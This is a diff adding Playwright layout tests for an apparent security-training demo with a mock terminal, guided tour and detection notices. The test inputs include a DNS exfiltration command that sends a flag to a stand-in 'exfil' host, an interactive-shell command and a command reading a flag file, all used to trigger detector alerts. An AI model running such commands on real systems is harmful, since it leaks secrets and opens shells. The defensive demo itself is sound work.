@@ -278,7 +278,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
       expect(await tour.evaluate((el) => el.closest("#tour-below") !== null)).toBe(true);
     } else {
       await expect(bar).toHaveAttribute("data-layout", "side");
-      await expect(bar.locator(".tour__count")).toContainText("uses two of your runs");
+      await expect(bar.locator(".tour__cost")).toHaveText("Uses two of your runs.");
     }
     await expect(tour.locator('.tour__step[data-current="true"] .tour__title')).toHaveText("Look around");
     // Step 1's button opens the terminal with `id` picked; Enter runs it and the step ticks.
@@ -474,6 +474,106 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
   });
   }
 
+  test("the terminal keeps one height: six commands later its box is as tall as before, the page has not moved, and each 'why?' is folded to a line", async ({ page }) => {
+    await page.goto("/?mock=1&mock-speed=0.3");
+    const term = page.locator("#terminal");
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    const input = term.locator("#term-input");
+    await expect(input).toBeEnabled({ timeout: 10_000 });
+    await page.evaluate(() => document.querySelector(".term__out")?.scrollIntoView({ behavior: "instant", block: "start" }));
+    await page.evaluate(() => scrollBy(0, -80));
+    const h = () => term.locator(".term__out").evaluate((e) => Math.round(e.getBoundingClientRect().height));
+    const before = { out: await h(), y: await page.evaluate(() => scrollY) };
+    expect(before.out).toBeGreaterThan(200);
+    const cmds = ["id", "ps", "hostname", "ls -la /srv/shop", "grep Cap /proc/self/status", "cat /srv/shop/.flag"];
+    for (const [i, cmd] of cmds.entries()) {
+      await input.fill(cmd);
+      await input.press("Enter");
+      await expect(term.locator(".term__cmd .term__explain")).toHaveCount(i + 1, { timeout: 10_000 });
+      await expect(input).toBeEnabled({ timeout: 10_000 });
+    }
+    await expect(term.locator(".term__cmd")).toHaveCount(6);
+    expect(await h()).toBe(before.out);
+    // (A pixel's rounding of the browser's scroll anchoring aside.)
+    expect(Math.abs((await page.evaluate(() => scrollY)) - before.y)).toBeLessThanOrEqual(1);
+    // The output scrolls inside, at its bottom; the explanations are one line each, opened on a press.
+    const out = await term.locator(".term__out").evaluate((e) => ({ sh: e.scrollHeight, ch: e.clientHeight, top: e.scrollTop }));
+    if (out.sh > out.ch) expect(out.top + out.ch).toBeGreaterThanOrEqual(out.sh - 8);
+    const why = term.locator(".term__explain").first();
+    await expect(why.locator("summary")).toHaveText("why?");
+    await expect(why.locator("p")).toBeHidden();
+  });
+
+  test("'Do this step' marks what it picked - the input it filled and the command's chip - with a ring and a 'Step n' tag that stays until the step is done", async ({ page }) => {
+    await page.goto("/?mock=1&mock-speed=0.3");
+    const tour = page.locator("#tour-steps");
+    if (!(await tour.isVisible())) await page.locator("#tour .tour").getByRole("button", { name: "Do this step" }).click();
+    else await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
+    const form = page.locator("#terminal .term__form");
+    await expect(page.locator("#term-input")).toHaveValue("id", { timeout: 10_000 });
+    await expect(form).toHaveAttribute("data-suggested", "true");
+    await expect(form).toHaveAttribute("data-step", "1");
+    expect(await form.evaluate((e) => getComputedStyle(e, "::after").content)).toBe('"Step 1"');
+    expect(await form.evaluate((e) => getComputedStyle(e).outlineStyle)).toBe("solid");
+    await expect(page.locator('#terminal .term__chip[data-id="whoami"]')).toHaveAttribute("data-suggested", "true");
+    // Not a flash: still there five seconds on.
+    await page.waitForTimeout(5_000);
+    await expect(form).toHaveAttribute("data-suggested", "true");
+    // The step is done: the mark goes.
+    await page.locator("#term-input").press("Enter");
+    await expect(page.locator('#tour-steps .tour__step[data-id="look"]')).toHaveAttribute("data-done", "true");
+    await expect(form).not.toHaveAttribute("data-suggested", "true");
+    await expect(page.locator('#terminal .term__chip[data-suggested="true"]')).toHaveCount(0);
+  });
+
+  test("the tour's side panel never scrolls inside: all six steps in view at 1440x900 and 1920x1080, with four notices the newest two and 'Earlier notices (n)'", async ({ page, isMobile }) => {
+    test.skip(isMobile, "the side panel is a wide-screen layout");
+    test.setTimeout(90_000);
+    await page.setViewportSize({ width: 1440, height: 900 });
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=2000");
+    const term = page.locator("#terminal");
+    const panel = page.locator("#tour .tour");
+    const fits = () => panel.evaluate((el) => ({ sh: el.scrollHeight, ch: el.clientHeight, top: el.getBoundingClientRect().top, bottom: el.getBoundingClientRect().bottom, vh: innerHeight }));
+    // Four notices: the DNS trick's SIEM incident, then a shell caught twice (Falco and Talon each time).
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
+    await expect(page.locator("#tour-steps .tour__notice--siem")).toHaveCount(1, { timeout: 25_000 });
+    await term.getByRole("button", { name: "sh -i", exact: true }).click();
+    await expect(page.locator("#tour-steps .tour__notice")).toHaveCount(3, { timeout: 20_000 });
+    await term.getByRole("button", { name: "Run another session" }).click();
+    const open = term.getByRole("button", { name: /Open the terminal/ });
+    if (await open.isVisible()) await open.click();
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    await term.getByRole("button", { name: "sh -i", exact: true }).click();
+    await expect.poll(() => page.locator("#tour-steps .tour__notice").count(), { timeout: 20_000 }).toBeGreaterThanOrEqual(4);
+    const n = await page.locator("#tour-steps .tour__notice").count();
+    await expect(page.locator("#tour-steps .tour__notice:visible")).toHaveCount(2);
+    const more = panel.getByRole("button", { name: `Earlier notices (${n - 2})` });
+    await expect(more).toHaveAttribute("aria-expanded", "false");
+    for (const [width, height] of [
+      [1440, 900],
+      [1920, 1080],
+    ]) {
+      await page.setViewportSize({ width, height });
+      await page.evaluate(() => document.querySelector("#tour")?.scrollIntoView({ behavior: "instant" }));
+      await page.waitForTimeout(150);
+      await expect(panel.locator(".tour__step")).toHaveCount(6);
+      for (const step of await panel.locator(".tour__step").all()) await expect(step).toBeInViewport({ ratio: 1 });
+      const m = await fits();
+      expect(m.sh).toBeLessThanOrEqual(m.ch);
+      expect(m.bottom).toBeLessThanOrEqual(m.vh + 1);
+    }
+    // The earlier one opens in place: the panel grows with the page, still never scrolls inside.
+    await more.click();
+    await expect(page.locator("#tour-steps .tour__notice:visible")).toHaveCount(n);
+    await expect(panel.getByRole("button", { name: "Fewer notices" })).toHaveAttribute("aria-expanded", "true");
+    const m = await fits();
+    expect(m.sh).toBeLessThanOrEqual(m.ch);
+    // No chip, no fade: nothing about an inner scroll is left.
+    await expect(panel.locator(".tour__newchip")).toHaveCount(0);
+    expect(await panel.evaluate((el) => [getComputedStyle(el).overflowY, getComputedStyle(el).maskImage])).toEqual(["visible", "none"]);
+  });
 
   test("the About bar: the first About sentence verbatim, then the automation line on its own line", async ({ page }) => {
     await page.goto("/?mock=1");
